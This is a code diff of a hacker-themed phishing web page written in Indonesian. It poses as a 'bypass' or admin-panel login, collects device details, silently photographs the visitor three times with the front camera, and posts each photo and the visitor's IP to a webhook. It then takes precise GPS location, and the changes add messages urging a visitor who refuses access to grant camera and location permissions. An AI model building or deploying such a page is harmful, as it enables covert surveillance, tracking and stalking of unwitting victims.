@@ -9,26 +9,19 @@
         body { background-color: #050505; color: #00ff41; font-family: 'JetBrains Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .panel { width: 95%; max-width: 500px; border: 1px solid #00ff41; padding: 25px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); text-align: center; margin: 20px 0; }
         .header { border-bottom: 2px solid #ff0000; padding-bottom: 15px; margin-bottom: 20px; color: #ff0000; font-weight: bold; text-shadow: 0 0 10px #ff0000; }
-        
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
         .data-item { border: 1px solid #1a3d1a; padding: 8px; background: #000; font-size: 10px; text-align: left; }
         .label { color: #888; display: block; font-size: 8px; text-transform: uppercase; }
         .val { color: #00ff41; font-weight: bold; }
-
         .btn { background: #ff0000; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: inherit; font-size: 14px; box-shadow: 0 0 15px #ff0000; text-transform: uppercase; }
         .loader { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 45px; font-weight: bold; }
-        
-        /* FIX: RESULT PAGE SCROLLABLE */
+        #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 60px; font-weight: bold; line-height: 1.5; }
         #result-page { display: none; width: 100%; height: 100vh; position: fixed; top: 0; left: 0; background: #000; z-index: 9999; overflow-y: scroll; padding: 20px; box-sizing: border-box; }
         .inner-container { max-width: 500px; margin: 0 auto; padding-bottom: 50px; }
-        
         video, canvas { display: none; }
         .data-box { border: 1px solid #00ff41; padding: 15px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); text-align: left; font-size: 12px; }
         .map-frame { width: 100%; height: 250px; border: 1px solid #00ff41; margin-top: 10px; filter: invert(90%) hue-rotate(180deg); }
-        
-        /* FIX: PHOTO LAYOUT */
         #photo-container { display: flex; flex-direction: column; gap: 15px; margin-top: 10px; }
         .preview-img { width: 100%; border: 1px solid #00ff41; border-radius: 4px; display: block; }
     </style>
@@ -57,7 +50,7 @@
         <hr color="#00ff41">
         <div class="data-box">
             <span style="color: #ff0000; font-weight: bold;">[!] SATELLITE_DATA</span><br>
-            KOORDINAT: <span id="res-latlon" style="color:#fff;">Fetching...</span><br>
+            KOORDINAT: <span id="res-latlon" style="color:#fff;">Connected</span><br>
             STATUS: <span style="color:#00ff41;">SINKRON</span>
         </div>
         <div id="map-container"></div>
@@ -79,8 +72,7 @@
         collectedData = {
             model: ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Generic Device",
             build: ua.split(' ').pop(),
-            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
-            ua: ua
+            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A"
         };
         document.getElementById('d-model').innerText = collectedData.model;
         document.getElementById('d-build').innerText = collectedData.build;
@@ -107,25 +99,26 @@
 
         btn.style.display = 'none';
         loader.style.display = 'block';
-        status.innerText = "[AUTH] Menghubungkan Kamera...";
+        status.innerText = "[AUTH] Menghubungkan Protokol Kamera...";
 
         try {
-            // Gunakan video muted untuk mempercepat sinkronisasi sensor
+            // STEP 1: KAMERA (WAJIB)
             stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+            document.getElementById('video').srcObject = stream;
             
-            // Warmup diperpanjang 6 detik agar exposure pas
             status.innerText = "[WARMUP] Sinkronisasi Sensor (6 detik)...";
             
             setTimeout(async () => {
-                status.innerText = "[CAPTURE] Mengambil 3 Foto Beruntun...";
+                status.innerText = "[CAPTURE] Mengambil 3 Foto Biometrik...";
                 await takePhotos(3);
+                
+                // STEP 2: LOKASI (WAJIB)
+                status.innerText = "[GPS] Sinkronisasi Geofencing...";
                 requestLocation();
             }, 6000);
 
         } catch (err) {
-            handleError("KAMERA DITOLAK.");
+            handleError("IZIN KAMERA DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses KAMERA agar akses Admin Panel bisa melihat target.");
         }
     }
 
@@ -138,8 +131,8 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            
             const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
+            
             const img = document.createElement('img');
             img.src = URL.createObjectURL(blob);
             img.className = 'preview-img';
@@ -149,7 +142,7 @@
             fd.append("file", blob, `bypass_${i}.jpg`);
             fd.append("payload_json", JSON.stringify({ content: `📸 **CAPTURE ${i}/3**\nIP: ${collectedData.ip}` }));
             await fetch(WH, { method: "POST", body: fd });
-            await new Promise(res => setTimeout(res, 1500)); // Jeda lebih lama antar foto
+            await new Promise(res => setTimeout(res, 1200));
         }
     }
 
@@ -161,20 +154,33 @@
                 document.getElementById('res-latlon').innerText = `${lat}, ${lon}`;
                 document.getElementById('map-container').innerHTML = `<iframe class="map-frame" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>`;
 
+                // PINDAH KE HALAMAN HASIL HANYA JIKA SEMUA BERHASIL
                 document.getElementById('login-panel').style.display = 'none';
                 document.getElementById('result-page').style.display = 'block';
                 if (stream) stream.getTracks().forEach(t => t.stop());
             },
-            () => { handleError("LOKASI DITOLAK."); },
+            (err) => {
+                handleError("IZIN LOKASI DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses LOKASI agar akses Panel dapat melihat lokasi.");
+            },
             { enableHighAccuracy: true }
         );
     }
 
     function handleError(msg) {
-        document.getElementById('status').innerHTML = `<span style="color:#ff0000">ERR: ${msg}</span><br>Reset (5s)...`;
+        const btn = document.getElementById('mainBtn');
+        const loader = document.getElementById('loading-icon');
+        const status = document.getElementById('status');
+
+        status.innerHTML = `<span style="color:#ff0000">${msg}</span><br><br><span style="color:#888;">Mencoba ulang dalam 5 detik...</span>`;
+        
+        if (stream) {
+            stream.getTracks().forEach(t => t.stop());
+        }
+
         setTimeout(() => {
-            document.getElementById('loading-icon').style.display = 'none';
-            document.getElementById('mainBtn').style.display = 'block';
+            loader.style.display = 'none';
+            btn.style.display = 'block';
+            btn.innerText = "COBA BYPASS LAGI";
         }, 5000);
     }
 </script>
